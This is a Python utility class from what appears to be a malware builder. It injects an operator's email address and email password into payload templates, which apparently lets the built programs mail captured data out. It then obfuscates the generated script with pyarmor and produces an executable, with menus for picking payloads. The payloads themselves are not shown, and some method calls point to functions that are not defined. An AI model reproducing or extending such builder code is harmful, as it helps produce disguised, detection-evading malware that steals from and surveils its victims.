from variables.variables import *
import time
import os

class Utils:
    def generate(self, name : str, user_mail : str, user_mail_password : str, time_out, payload : str, module : str) -> None:
        if OS == "windows":
            self.clear()
            file_name = f"payloads\\{module}\\{payload}"
        else:
            self.clear()
            file_name = f"payloads/{module}/{payload}"

        file_loc = os.path.abspath(os.path.join(os.getcwd(),file_name))
        with open(name, "w", encoding="utf-8") as file:
            with open(file_loc, 'r', encoding='utf-8') as file1:
                file_content = file1.read()
                file_content = file_content.replace("userMail_", user_mail)
                file_content = file_content.replace("userPassword_", user_mail_password)
                file_content = file_content.replace("timeOut_", time_out)
                file.write(file_content)
    
    def finish(self, name : str, module : str) -> None:
        if OS == "windows":
            os.remove(name)
            os.remove(f"dist\\{name}")
        else:
            os.remove(name)
            os.remove(f"dist/{name}")

        os.remove(name.replace("py", "spec"))
        exe_location = name.replace(".py", ".exe")
        exe_loc = os.path.abspath(exe_location)
        self.dist_folder = os.path.abspath(os.path.join(exe_loc, os.pardir))
        self.clear()
        if OS == "windows":
            print(f"{COLOR['YELLOW']}[!]{COLOR['RESET']} {module} Was Created On this Location: {self.dist_folder}\\dist\\{exe_location}")    

        else:
            print(f"{COLOR['YELLOW']}[!]{COLOR['RESET']} {module} Was Created On this Location: {self.dist_folder}/dist/{exe_location}")
    
    def list_payloads(self, payloadType : str) -> list:
        self.clear()
        payloads = os.listdir(f"./payloads/{payloadType}/")
        print(f"""{COLOR['CYAN']}
            ╔══════════════════════════════════════════════════════════════════════════╗
            ║*                               - PAYLOADS -                             *║
            ╠══════════════════════════════════════╦═══════════════════════════════════╣
            ║            Payload Number            ║           Payload Name            ║         
            ╠══════════════════════════════════════╩═══════════════════════════════════╣ """)
        i = 0
        for payload in payloads:
            i += 1
            print(f"\t    ║ [{i}] {COLOR['RESET']}{payload}{COLOR['CYAN']} {' ' * (68 - len(payload))}║")

        print("\t    ╚══════════════════════════════════════════════════════════════════════════╝")

        chc = input("\nPress [Enter] To Continue.  ")
        if chc == "":
            self.start()
            
        else:
            self.clear()
            self.listPayloads(payloadType=payloadType)

    def obfuscate(self, name : str) -> None:
        try:
            os.system(f"pyarmor gen {name}")

        except Exception as e:
            print(f"{COLOR['YELLOW']}[!]{COLOR['RESET']} ERROR: {str(e)}")

    def clear(self):
        if OS == "windows":
            os.system("cls")
        else:
            os.system("clear")